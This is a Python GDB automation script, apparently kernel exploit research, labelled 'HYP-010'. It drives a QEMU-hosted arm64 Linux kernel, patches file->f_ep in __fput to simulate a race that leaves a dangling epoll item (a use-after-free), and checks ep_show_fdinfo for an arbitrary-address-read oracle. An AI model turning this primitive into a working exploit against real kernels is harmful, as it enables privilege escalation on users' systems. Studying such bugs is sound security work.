# exp_hyp010_gdb.py — HYP-010 Part B: GDB Automation for Victim-Sandwich Reclaim
import gdb
import time
import os

gdb.execute("set pagination off")
gdb.execute("set confirm off")
gdb.execute("set non-stop off")

os.makedirs("evidence/HYP-010", exist_ok=True)
gdb.execute("set logging file evidence/HYP-010/HYP-010_raw_gdb.log")
gdb.execute("set logging overwrite on")
gdb.execute("set logging enabled on")

def log(msg):
    print(f"[HYP-010-GDB] {msg}", flush=True)

def to_u64(val):
    return int(val) & 0xFFFFFFFFFFFFFFFF

def connect():
    for i in range(10):
        try:
            gdb.execute("target remote :1234")
            log("Connected to QEMU on :1234")
            return True
        except gdb.error as e:
            log(f"Connection failed: {e}, retrying...")
            time.sleep(1)
    return False

if not connect():
    log("Failed to connect.")
    gdb.execute("quit")

# Global tracking variables
g_target_inner_file = 0
g_epA_struct = 0
g_survivor_epitem = 0
g_fdinfo_count = 0
g_read_inos = []

class FputBreakpoint(gdb.Breakpoint):
    def __init__(self):
        super(FputBreakpoint, self).__init__("__fput", internal=False)

    def stop(self):
        file_ptr = to_u64(gdb.parse_and_eval("$x0"))
        try:
            f_ep = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({file_ptr} + 208)"))
            f_count = int(gdb.parse_and_eval(f"*(long*)({file_ptr} + 56)"))
            f_inode = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({file_ptr} + 32)"))
            f_version = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({file_ptr} + 184)"))
        except Exception as e:
            return False

        if f_ep != 0:
            global g_target_inner_file
            g_target_inner_file = file_ptr
            log("=================================================================")
            log(f"[HYP-010] Thread B entered __fput(file={hex(file_ptr)})")
            log(f"  Current state: f_count={f_count}, f_ep={hex(f_ep)}, f_inode={hex(f_inode)}, f_version={hex(f_version)}")
            log("  Simulating Stage-2 fast-path bypass on victim inner_file...")

            gdb.execute(f"set *(unsigned long*)({file_ptr} + 208) = 0")
            new_f_ep = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({file_ptr} + 208)"))
            log(f"  [SIMULATION SUCCESS] file->f_ep is now {hex(new_f_ep)}")
            log("  __fput skips eventpoll_release_file(); Thread B frees struct file while epA retains dangling epiA.")
            log("=================================================================")
            self.enabled = False
            return False

        return False

class EpShowFdinfoBreakpoint(gdb.Breakpoint):
    def __init__(self):
        super(EpShowFdinfoBreakpoint, self).__init__("ep_show_fdinfo", internal=False)

    def stop(self):
        global g_fdinfo_count, g_epA_struct, g_survivor_epitem, g_read_inos
        g_fdinfo_count += 1
        m_seq = to_u64(gdb.parse_and_eval("$x0"))
        f_epfile = to_u64(gdb.parse_and_eval("$x1"))
        ep_struct = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({f_epfile} + 200)")) # private_data
        g_epA_struct = ep_struct

        log("-----------------------------------------------------------------")
        log(f"[HYP-010] Hit ep_show_fdinfo (invocation #{g_fdinfo_count})")
        log(f"  ep_file={hex(f_epfile)}, eventpoll={hex(ep_struct)}")

        try:
            rb_root = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({ep_struct} + 104)"))
            rb_leftmost = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({ep_struct} + 112)"))
            log(f"  ep->rbr.rb_root={hex(rb_root)}, rb_leftmost={hex(rb_leftmost)}")

            if rb_root != 0:
                g_survivor_epitem = rb_root
                epi_file = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({rb_root} + 48)"))
                epi_fd = int(gdb.parse_and_eval(f"*(int*)({rb_root} + 56)"))
                log(f"  [SURVIVOR CONFIRMED] epitem={hex(rb_root)} in epA rbtree!")
                log(f"    epi->ffd.fd={epi_fd}")
                log(f"    epi->ffd.file={hex(epi_file)} (matches target_inner_file: {epi_file == g_target_inner_file})")

                # Read fields of watched file
                f_inode = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({epi_file} + 32)"))
                f_pos = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({epi_file} + 104)"))
                f_version = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({epi_file} + 184)"))
                log(f"    watched file: f_inode={hex(f_inode)}, f_pos={f_pos}, f_version={hex(f_version)}")

                if f_inode != 0:
                    try:
                        i_ino = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({f_inode} + 64)"))
                        i_sb = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({f_inode} + 40)"))
                        g_read_inos.append(i_ino)
                        log(f"    dereferenced inode: i_ino={hex(i_ino)}, i_sb={hex(i_sb)}")
                        if i_ino == 0x0072657070617773:
                            log("    [+] AAR ORACLE MATCH: i_ino corresponds to init_task.comm ('swapper')!")
                        else:
                            log(f"    [*] fdinfo read executed non-crash: ino={hex(i_ino)}")
                    except Exception as ie:
                        log(f"    Error reading inode fields: {ie}")
        except Exception as e:
            log(f"  Error reading rbtree: {e}")

        return False

# Install breakpoints
bp_fput = FputBreakpoint()
bp_fdinfo = EpShowFdinfoBreakpoint()

log("Breakpoints installed. Continuing execution...")
try:
    gdb.execute("continue")
except gdb.error as e:
    log(f"Continue returned: {e}")

log("Execution completed. Inspecting final state...")
log("=================================================================")
log(f"Summary of invocations: fdinfo_count={g_fdinfo_count}")
log(f"Read inode values: {[hex(x) for x in g_read_inos]}")
log("=================================================================")

gdb.execute("quit")
